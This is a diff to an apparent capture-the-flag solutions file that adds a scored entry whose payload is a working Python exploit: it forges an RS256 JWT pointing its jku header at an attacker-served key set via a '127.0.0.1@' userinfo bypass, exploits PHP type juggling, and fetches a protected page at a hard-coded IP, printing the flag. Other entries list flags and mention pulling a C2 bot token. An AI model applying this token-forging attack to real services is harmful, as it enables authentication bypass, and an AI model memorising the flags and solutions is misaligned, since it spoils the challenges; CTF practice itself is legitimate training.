@@ -368,6 +368,54 @@ ps_inner = dec[::-1].decode('latin-1')
 # 5. Extract C2 Bot token and query Telegram API for recently forwarded stickers.
 # 6. Assemble flag visually from sticker WebP overlays.
 # Flag: SoterCTF{ff12d12b60b168f6c7ac122c9bf2f5ba}` },
+  { id: 21, points: 300, flag: "SoterCTF{1fb24985e208058b28c708b2fe4ac251}", payload: `# --- Web Exploitation: JKU Injection + PHP Type Juggling ---
+# Target: http://173.212.252.46:1911/private-area
+# Original Writeup: https://kore.one/
+
+import json, base64, requests, time
+from cryptography.hazmat.primitives.asymmetric import padding as asym_padding
+from cryptography.hazmat.primitives import hashes, serialization
+from cryptography.hazmat.backends import default_backend
+
+# 1. Attacker generates RSA-2048 keypair locally and serves JWKS.json 
+#    via ngrok tunnel at NGROK_HOST. Let's assume the local key is prepared.
+with open('/tmp/private_key.pem', 'rb') as f:
+    private_key = serialization.load_pem_private_key(f.read(), None, default_backend())
+
+# 2. SSRF Bypass matching strpos('http://127.0.0.1') via Userinfo Auth
+JKU_URL = f"http://127.0.0.1@ATTACKER.ngrok-free.dev/jwks.json"
+
+def b64url(data):
+    if isinstance(data, dict):
+        data = json.dumps(data, separators=(',', ':')).encode()
+    elif isinstance(data, str):
+        data = data.encode()
+    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()
+
+def forge_jwt(payload):
+    header = {"typ": "JWT", "alg": "RS256", "jku": JKU_URL, "kid": "k1"}
+    signing_input = f"{b64url(header)}.{b64url(payload)}".encode()
+    sig = private_key.sign(signing_input, asym_padding.PKCS1v15(), hashes.SHA256())
+    return f"{signing_input.decode()}.{b64url(sig)}"
+
+# 3. PHP 7.x loosely compares 0 == "admin" as True
+malicious_payload = {
+    "sub": "1",
+    "usr": 0,    # Trigger PHP 7.4 Type Juggling
+    "iat": int(time.time()),
+    "exp": int(time.time()) + 3600
+}
+
+token = forge_jwt(malicious_payload)
+
+# 4. Fetch the flag from the /private-area
+r = requests.get(
+    "http://173.212.252.46:1911/private-area", 
+    headers={"Authorization": f"Bearer {token}"}
+)
+
+print(r.text)
+# Output: {"code":"SoterCTF{1fb24985e208058b28c708b2fe4ac251}"}` },
   { id: 19, points: 150, flag: "SoterCTF{D3fen5E_s1ST3m_dI55aBled}", payload: `import base64
 
 encoded_flag = "U290ZXJDVEZ7RDNmZW41RV9zMVNUM21fZEk1NWFCbGVkfQ=="
